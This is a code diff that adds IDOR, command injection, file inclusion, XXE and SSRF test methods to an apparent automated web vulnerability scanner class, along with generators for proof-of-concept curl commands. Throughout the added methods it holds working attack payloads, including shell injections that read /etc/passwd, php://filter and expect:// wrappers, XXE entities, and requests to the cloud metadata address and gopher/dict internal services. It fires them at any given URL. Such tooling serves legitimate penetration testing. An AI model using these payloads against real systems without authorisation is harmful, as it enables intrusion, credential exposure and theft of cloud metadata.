@@ -661,6 +661,345 @@ class MultiTargetAnalyzer:
         
         return findings
     
+    def test_idor(self, url):
+        """Test for Insecure Direct Object References"""
+        findings = []
+        
+        # Common IDOR patterns
+        idor_patterns = [
+            '/user/1', '/user/2', '/user/admin',
+            '/profile/1', '/profile/2', '/profile/admin',
+            '/account/1', '/account/2', '/account/admin',
+            '/document/1', '/document/2', '/document/admin',
+            '/file/1', '/file/2', '/file/admin',
+            '/api/user/1', '/api/user/2', '/api/user/admin',
+            '/api/v1/user/1', '/api/v1/user/2', '/api/v1/user/admin'
+        ]
+        
+        base_url = url.rstrip('/')
+        
+        for pattern in idor_patterns:
+            try:
+                test_url = base_url + pattern
+                response = requests.get(test_url, timeout=10, verify=False)
+                
+                # Check for successful responses that might indicate IDOR
+                if response.status_code == 200:
+                    # Look for sensitive data patterns
+                    sensitive_patterns = [
+                        'email', 'password', 'token', 'api_key', 'secret',
+                        'ssn', 'credit_card', 'phone', 'address', 'private'
+                    ]
+                    
+                    content_lower = response.text.lower()
+                    found_sensitive = [p for p in sensitive_patterns if p in content_lower]
+                    
+                    if found_sensitive:
+                        findings.append({
+                            'type': 'idor',
+                            'severity': 'high',
+                            'title': 'Insecure Direct Object Reference',
+                            'description': f'IDOR vulnerability found at {pattern}',
+                            'evidence': {
+                                'url': test_url,
+                                'status_code': response.status_code,
+                                'sensitive_data': found_sensitive,
+                                'response_snippet': response.text[:500]
+                            },
+                            'poc': self.generate_idor_poc(test_url, found_sensitive),
+                            'timestamp': time.time()
+                        })
+                        
+                        self.take_screenshot(f"idor_{pattern.replace('/', '_')}")
+                
+            except Exception as e:
+                continue
+        
+        return findings
+    
+    def test_command_injection(self, url):
+        """Test for command injection vulnerabilities"""
+        findings = []
+        
+        # Command injection payloads
+        payloads = [
+            '; ls -la',
+            '| whoami',
+            '&& cat /etc/passwd',
+            '; cat /etc/passwd',
+            '`whoami`',
+            '$(whoami)',
+            '; ping -c 1 127.0.0.1',
+            '| ping -c 1 127.0.0.1'
+        ]
+        
+        test_params = ['cmd', 'command', 'exec', 'system', 'ping', 'host']
+        
+        for param in test_params:
+            for payload in payloads:
+                try:
+                    test_url = f"{url}?{param}={payload}"
+                    response = requests.get(test_url, timeout=10, verify=False)
+                    
+                    # Check for command execution indicators
+                    indicators = ['root:', 'bin:', 'daemon:', 'PING', 'packets transmitted']
+                    
+                    for indicator in indicators:
+                        if indicator in response.text:
+                            findings.append({
+                                'type': 'command_injection',
+                                'severity': 'critical',
+                                'title': 'Command Injection Vulnerability',
+                                'description': f'Command injection found in parameter "{param}"',
+                                'evidence': {
+                                    'parameter': param,
+                                    'payload': payload,
+                                    'url': test_url,
+                                    'indicator': indicator,
+                                    'response_snippet': response.text[:1000]
+                                },
+                                'poc': self.generate_command_injection_poc(url, param, payload),
+                                'timestamp': time.time()
+                            })
+                            
+                            self.take_screenshot(f"command_injection_{param}")
+                            break
+                
+                except Exception as e:
+                    continue
+        
+        return findings
+    
+    def test_file_inclusion(self, url):
+        """Test for file inclusion vulnerabilities"""
+        findings = []
+        
+        # File inclusion payloads
+        payloads = [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+            '/etc/passwd',
+            'C:\\windows\\system32\\drivers\\etc\\hosts',
+            'php://filter/read=convert.base64-encode/resource=index.php',
+            'file:///etc/passwd',
+            'expect://whoami'
+        ]
+        
+        test_params = ['file', 'page', 'include', 'path', 'template', 'view']
+        
+        for param in test_params:
+            for payload in payloads:
+                try:
+                    test_url = f"{url}?{param}={payload}"
+                    response = requests.get(test_url, timeout=10, verify=False)
+                    
+                    # Check for file inclusion indicators
+                    indicators = ['root:x:', 'daemon:x:', '# localhost', 'PD9waHA']
+                    
+                    for indicator in indicators:
+                        if indicator in response.text:
+                            findings.append({
+                                'type': 'file_inclusion',
+                                'severity': 'high',
+                                'title': 'File Inclusion Vulnerability',
+                                'description': f'File inclusion found in parameter "{param}"',
+                                'evidence': {
+                                    'parameter': param,
+                                    'payload': payload,
+                                    'url': test_url,
+                                    'indicator': indicator,
+                                    'response_snippet': response.text[:1000]
+                                },
+                                'poc': self.generate_file_inclusion_poc(url, param, payload),
+                                'timestamp': time.time()
+                            })
+                            
+                            self.take_screenshot(f"file_inclusion_{param}")
+                            break
+                
+                except Exception as e:
+                    continue
+        
+        return findings
+    
+    def test_xxe(self, url):
+        """Test for XXE vulnerabilities"""
+        findings = []
+        
+        # XXE payloads
+        xxe_payloads = [
+            '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>''',
+            '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<root>&xxe;</root>'''
+        ]
+        
+        for payload in xxe_payloads:
+            try:
+                headers = {'Content-Type': 'application/xml'}
+                response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
+                
+                # Check for XXE indicators
+                indicators = ['root:x:', 'daemon:x:', 'ami-', 'instance-id']
+                
+                for indicator in indicators:
+                    if indicator in response.text:
+                        findings.append({
+                            'type': 'xxe',
+                            'severity': 'high',
+                            'title': 'XML External Entity (XXE) Vulnerability',
+                            'description': 'XXE vulnerability allows file disclosure',
+                            'evidence': {
+                                'payload': payload,
+                                'url': url,
+                                'indicator': indicator,
+                                'response_snippet': response.text[:1000]
+                            },
+                            'poc': self.generate_xxe_poc(url, payload),
+                            'timestamp': time.time()
+                        })
+                        
+                        self.take_screenshot("xxe_vulnerability")
+                        break
+            
+            except Exception as e:
+                continue
+        
+        return findings
+    
+    def test_ssrf(self, url):
+        """Test for Server-Side Request Forgery"""
+        findings = []
+        
+        # SSRF payloads
+        ssrf_payloads = [
+            'http://169.254.169.254/latest/meta-data/',
+            'http://localhost:22',
+            'http://127.0.0.1:3306',
+            'file:///etc/passwd',
+            'gopher://127.0.0.1:3306',
+            'dict://127.0.0.1:11211'
+        ]
+        
+        test_params = ['url', 'link', 'src', 'target', 'redirect', 'callback']
+        
+        for param in test_params:
+            for payload in ssrf_payloads:
+                try:
+                    test_url = f"{url}?{param}={payload}"
+                    response = requests.get(test_url, timeout=10, verify=False)
+                    
+                    # Check for SSRF indicators
+                    indicators = ['ami-', 'instance-id', 'SSH-', 'mysql_native_password']
+                    
+                    for indicator in indicators:
+                        if indicator in response.text:
+                            findings.append({
+                                'type': 'ssrf',
+                                'severity': 'high',
+                                'title': 'Server-Side Request Forgery (SSRF)',
+                                'description': f'SSRF vulnerability found in parameter "{param}"',
+                                'evidence': {
+                                    'parameter': param,
+                                    'payload': payload,
+                                    'url': test_url,
+                                    'indicator': indicator,
+                                    'response_snippet': response.text[:1000]
+                                },
+                                'poc': self.generate_ssrf_poc(url, param, payload),
+                                'timestamp': time.time()
+                            })
+                            
+                            self.take_screenshot(f"ssrf_{param}")
+                            break
+                
+                except Exception as e:
+                    continue
+        
+        return findings
+    
+    def generate_idor_poc(self, url, sensitive_data):
+        """Generate IDOR PoC"""
+        return {
+            'title': 'Insecure Direct Object Reference (IDOR) Proof of Concept',
+            'steps': [
+                f'1. Navigate to: {url}',
+                f'2. Observe unauthorized access to sensitive data: {", ".join(sensitive_data)}',
+                f'3. Try different ID values to access other users\' data',
+                f'4. Impact: Unauthorized data access, privacy violation'
+            ],
+            'curl_command': f'curl -X GET "{url}"',
+            'severity': 'High',
+            'cvss': '8.1',
+            'cwe': 'CWE-639'
+        }
+    
+    def generate_command_injection_poc(self, url, param, payload):
+        """Generate command injection PoC"""
+        return {
+            'title': 'Command Injection Proof of Concept',
+            'steps': [
+                f'1. Navigate to: {url}',
+                f'2. Inject command payload in parameter "{param}": {payload}',
+                f'3. Observe command execution output',
+                f'4. Impact: Remote code execution, server compromise'
+            ],
+            'curl_command': f'curl -X GET "{url}?{param}={payload}"',
+            'severity': 'Critical',
+            'cvss': '9.8',
+            'cwe': 'CWE-78'
+        }
+    
+    def generate_file_inclusion_poc(self, url, param, payload):
+        """Generate file inclusion PoC"""
+        return {
+            'title': 'File Inclusion Proof of Concept',
+            'steps': [
+                f'1. Navigate to: {url}',
+                f'2. Include file via parameter "{param}": {payload}',
+                f'3. Observe file contents disclosure',
+                f'4. Impact: Information disclosure, potential RCE'
+            ],
+            'curl_command': f'curl -X GET "{url}?{param}={payload}"',
+            'severity': 'High',
+            'cvss': '7.5',
+            'cwe': 'CWE-98'
+        }
+    
+    def generate_xxe_poc(self, url, payload):
+        """Generate XXE PoC"""
+        return {
+            'title': 'XML External Entity (XXE) Proof of Concept',
+            'steps': [
+                f'1. Send XML payload to: {url}',
+                f'2. Payload includes external entity reference',
+                f'3. Observe file disclosure or SSRF',
+                f'4. Impact: Information disclosure, SSRF, DoS'
+            ],
+            'curl_command': f'curl -X POST -H "Content-Type: application/xml" -d \'{payload}\' "{url}"',
+            'severity': 'High',
+            'cvss': '8.2',
+            'cwe': 'CWE-611'
+        }
+    
+    def generate_ssrf_poc(self, url, param, payload):
+        """Generate SSRF PoC"""
+        return {
+            'title': 'Server-Side Request Forgery (SSRF) Proof of Concept',
+            'steps': [
+                f'1. Navigate to: {url}',
+                f'2. Inject SSRF payload in parameter "{param}": {payload}',
+                f'3. Observe internal service response',
+                f'4. Impact: Internal network access, cloud metadata access'
+            ],
+            'curl_command': f'curl -X GET "{url}?{param}={payload}"',
+            'severity': 'High',
+            'cvss': '8.6',
+            'cwe': 'CWE-918'
+        }
+    
     def generate_xss_poc(self, url, param, payload):
         """Generate detailed XSS PoC"""
         return {
